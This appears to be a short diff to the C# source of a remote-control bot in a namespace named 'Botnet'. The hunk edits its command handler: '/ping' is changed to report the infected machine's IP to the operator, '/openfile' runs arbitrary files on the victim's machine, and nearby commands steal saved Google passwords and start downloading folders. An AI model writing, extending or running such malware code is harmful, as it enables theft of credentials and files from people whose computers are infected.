@@ -213,13 +213,13 @@ namespace Botnet
                         mainFuncs.GetGooglePasswords();
                         break;
                     case "/ping":
-                        ts.SendMessage($"[Ping] [] I'm up");
+                        ts.SendMessage($"[Ping] [{IP}] I'm up");
                         break;
                     case "/openfile":
                         if (CMD.ComContent == null)
                             ts.SendMessage("Usage - /OpenFile|<full path to file>  (without <>)");
                         else
-                            Process.Start(CMD.ComContent);
+                            mainFuncs.OpenFile(CMD.ComContent);
                         break;
                     case "/downloadfolder":
                         if (CMD.ComContent == null)
